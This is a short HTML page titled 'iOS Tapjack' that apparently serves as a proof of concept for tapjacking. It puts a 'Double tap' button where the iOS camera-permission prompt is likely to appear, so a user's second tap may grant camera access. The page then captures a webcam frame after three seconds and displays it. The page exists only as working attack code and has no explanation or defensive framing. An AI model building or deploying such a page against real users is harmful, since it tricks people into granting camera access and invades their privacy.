<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Tapjack</title>
    <style>
        .red-button {
            position: relative;
            top: 45vh;
            left: 45vw;
            background-color: rgb(79, 235, 89);
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        #videoElement, #capturedImage {
            display: none;
        }
    </style>
    <script>
        function requestCamera() {
            const videoElement = document.getElementById('videoElement');
            const capturedImage = document.getElementById('capturedImage');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        videoElement.srcObject = stream;
                        videoElement.play();
                        videoElement.style.display = 'block';

                        setTimeout(() => {
                            captureFrame(videoElement, capturedImage);
                            videoElement.style.display = 'none';
                        }, 3000); // Capture frame after 3 seconds
                    })
                    .catch((error) => {
                        alert('Error accessing camera: ' + error.message);
                    });
            } else {
                alert('Camera access is not supported by this browser.');
            }
        }

        function captureFrame(videoElement, capturedImage) {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            capturedImage.src = canvas.toDataURL('image/png');
            capturedImage.style.display = 'block';
        }
    </script>
</head>
<body>
    <button class="red-button" onclick="requestCamera()">Double tap</button>
    <video id="videoElement"></video>
    <img id="capturedImage" />
</body>
</html>
